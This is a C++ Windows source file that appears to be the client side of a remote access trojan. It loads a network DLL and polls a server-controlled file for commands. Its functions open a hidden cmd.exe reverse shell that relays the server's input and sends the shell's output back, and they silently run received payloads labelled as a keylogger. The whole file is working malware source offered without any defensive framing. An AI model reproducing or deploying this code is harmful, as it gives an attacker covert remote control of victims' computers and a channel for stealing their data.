// cl /EHsc .\target_script.cpp /link /OUT:target_script.exe  
#include <iostream>
#include <Windows.h>
#include <string>
#include <thread>
#include <fstream>
#include <vector>

///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
typedef int (*SendDataFunc)(const std::string&, const std::string&);
typedef std::string (*RecvDataFunc)(const std::string&);
typedef std::vector<unsigned char> (*RecvDataRawFunc)(const std::string&);

SendDataFunc send_data;
RecvDataFunc receive_data;
RecvDataRawFunc receive_data_raw;

LPCWSTR dllPath = L"network_lib.dll";
HINSTANCE hDLL;
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

HANDLE hChildStdOutRead, hChildStdOutWrite;                                     // stdout
HANDLE hChildStdInRead, hChildStdInWrite;                                       // stdin
bool connected = false;

/////////////////////////////////////////////////////////////////////////////////////////////////////////////////

bool ExecuteCommand(const std::string& command);
void give_command(const std::string &command);
void rev_shell();

/////////////////////////////////////////////////////////////////////////////////////////////////////////////////

int load_dll()
{
    hDLL = LoadLibraryW(dllPath);
    if (hDLL == NULL)
    {
        std::cerr << "Failed to load DLL: " << GetLastError() << std::endl;
        return EXIT_FAILURE;
    }

    receive_data_raw = (RecvDataRawFunc)GetProcAddress(hDLL, "?receive_data_raw@@YA?AV?$vector@EV?$allocator@E@std@@@std@@AEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@@Z");
    receive_data = (RecvDataFunc)GetProcAddress(hDLL, "?receive_data@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEBV12@@Z");
    send_data = (SendDataFunc)GetProcAddress(hDLL, "?send_data@@YAHAEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@0@Z");

    if (!receive_data || !send_data || !receive_data_raw)
    {
        std::cerr << "Failed to get one or more function addresses.\n";
        FreeLibrary(hDLL);
        return 1;
    }

    return 0;
}

int main()  
{
    load_dll();

    bool outerloop = true;
    while(outerloop)
    {

        Sleep(1000);

        // std::ifstream file("target_data.rat");
        // std::string lines[3];

        // for (int i = 0; i < 3 && std::getline(file, lines[i]); ++i);
        // send_data("con_targets.txt", lines[1] + " ( " + lines[2] +" )");

        //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

        bool loop = true;
        while(loop)
        {
            if(receive_data("from_server.txt")[0] == '`')
            {
                Sleep(1000);
                std::cout<< "waiting for data " << std::endl;
            }
            else
            {
                char option = receive_data("from_server.txt")[0];
                std::cout << "option: " << option << std::endl;
                switch (option)
                {
                    case '3':                                                                                     //rev shell
                    {
                        send_data("from_server.txt","`");                                                    //mark the file read(switch)
                        
                        rev_shell();
                        break;
                    }
                    case '4':                                                                                     //keylogger
                    {
                        
                        if(receive_data("from_server.txt")[0] == '`')
                        {
                            Sleep(100);
                            std::cout<< "waiting for payload " << std::endl;
                        }      
                        else
                        {
                            std::string payload_keylogger = (receive_data("from_server.txt").substr(1));
                            std::cout << "Recieved after waiting ->" << payload_keylogger << std::endl;
                            ExecuteCommand(payload_keylogger);
                        }
                        
                        send_data("from_server.txt","`");
                        //std::cout << "mark the received command as read [switch3]" << endl;
                        break;
                    }

                    case '~':                                                                                    //dc from server
                    {
                        send_data("from_server.txt","`");                                                    //mark the file read(switch)
                        //std::cout << "mark the file read [switch] inside case ~" << endl;
                        
                        //std::cout << "Server initiated disconnect.\n";
                        loop = false;
                        connected = false;
                        
                        break;
                    }
                    case '#':                                                                                    //end all
                    {
                        if(receive_data("from_server.txt")[0] == '`')
                        {
                            Sleep(100);
                            std::cout<< "waiting for payload " << std::endl;
                        }      
                        else
                        {
                            std::string payload_end = (receive_data("from_server.txt").substr(1));
                            std::cout << "Recieved after waiting ->" << payload_end << std::endl;
                            //ExecuteCommand(payload_end);
                        }
                        
                        send_data("from_server.txt","`");
                        //std::cout << "mark the received command as read [del]" << endl;
                        loop = false;
                        outerloop = false;
                        
                        break;
                    }
                    default:
                    {
                        send_data("from_server.txt","`");                                                //mark the file read(switch)
                                               
                        break;
                    }
                }
            }
        }
    }

    return 0;
}

bool ExecuteCommand(const std::string& command)
{
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi;

    // Convert std::string to std::wstring
    int wlen = MultiByteToWideChar(CP_UTF8, 0, command.c_str(), -1, NULL, 0);
    std::wstring wcommand(wlen, L'\0');
    MultiByteToWideChar(CP_UTF8, 0, command.c_str(), -1, &wcommand[0], wlen);

    std::wstring cmdLine = L"cmd.exe /c " + wcommand;

    if(!CreateProcessW(NULL,const_cast<wchar_t*>(cmdLine.c_str()),NULL,NULL,FALSE,CREATE_NO_WINDOW, NULL,NULL,&si,&pi))
    {
        std::cerr << "CreateProcess failed with error code: " << GetLastError() << std::endl;
        return false;
    }             

    // Close process and thread handles. 
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    return true;
}

void give_command(const std::string &command)
{
    std::string cmd = command + "\r\n";
    // Write a command to the child process.
    DWORD bytesWritten;
    if (!WriteFile(hChildStdInWrite, cmd.c_str(), cmd.length(), &bytesWritten, NULL)) std::cerr << "WriteFile failed with error code: " << GetLastError() << std::endl;
    FlushFileBuffers(hChildStdInWrite); // Ensure the command is sent.
}

void rev_shell()
{

    SECURITY_ATTRIBUTES saAttr = {0};
    saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
    saAttr.bInheritHandle = TRUE;

    // Create pipes for child process's STDOUT.
    CreatePipe(&hChildStdOutRead, &hChildStdOutWrite, &saAttr, 0);
    SetHandleInformation(hChildStdOutRead, HANDLE_FLAG_INHERIT, 0);

    // Create pipes for child process's STDIN.
    CreatePipe(&hChildStdInRead, &hChildStdInWrite, &saAttr, 0);
    SetHandleInformation(hChildStdInWrite, HANDLE_FLAG_INHERIT, 0);

    STARTUPINFOW si = {0};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    si.hStdOutput = hChildStdOutWrite;
    si.hStdError = hChildStdOutWrite;
    si.hStdInput = hChildStdInRead;

    PROCESS_INFORMATION pi = {0};
    wchar_t command[] = L"cmd.exe";
    if (!CreateProcessW(NULL, command, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi))
    {
        std::cerr << "CreateProcess failed with error code: " << GetLastError() << std::endl;
        //return 1;
    }

    // Close handles not needed by the parent.
    CloseHandle(hChildStdOutWrite);
    CloseHandle(hChildStdInRead);

    ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

    std::atomic<bool> processFinished(false);
    
    // Lambda for reading from the child process stdout
    auto readThread = std::thread([&]()
    {
        const size_t bufferSize = 4096;
        char buffer[bufferSize];
        DWORD bytesRead;

        while (!processFinished.load())
        {            
            if (ReadFile(hChildStdOutRead, buffer, bufferSize, &bytesRead, NULL))
            {
                if (bytesRead > 0) 
                {
                    buffer[bytesRead] = '\0';
                    std::cout << buffer;
                    send_data("from_client.txt" ,buffer);
                }
            } 
            else if (GetLastError() == ERROR_BROKEN_PIPE)
            {
                // End of data
                break;
            }

            Sleep(500); // Sleep for a short time to prevent 100% CPU usage
        } 
    });

    // Lambda to handle writing to child process's stdin
    auto writeThread = std::thread([&]()
    {
        std::string cmd;
        while (!processFinished.load())  // Check if process is finished
        {

            Sleep(500);

            if(receive_data("from_server.txt")[0] == '`')
            {
                //cout<< "waiting for rev shell data " << endl;
                continue;
            }
            
            cmd = receive_data("from_server.txt");
            send_data("from_server.txt","`");
            if (cmd == "exit")
            {
                processFinished.store(true); // Signal to stop reading thread
                //std::cout << "Exiting..." << std::endl;
                send_data("from_client.txt","`");
                break;
            }

            // Send the command to the child process's stdin
            give_command(cmd);
           
        }
    });

    /////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

    // Wait for process threads to finish
    writeThread.join();
    processFinished.store(true);

    // Close stdin and terminate child process
    std::string exitCmd = "exit\r\n";
    DWORD bytesWritten;
    WriteFile(hChildStdInWrite, exitCmd.c_str(), exitCmd.length(), &bytesWritten, NULL);
    FlushFileBuffers(hChildStdInWrite);

    WaitForSingleObject(pi.hProcess, INFINITE);

    // Clean up
    readThread.join();
    CloseHandle(hChildStdOutRead);
    CloseHandle(hChildStdInWrite);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);    

}
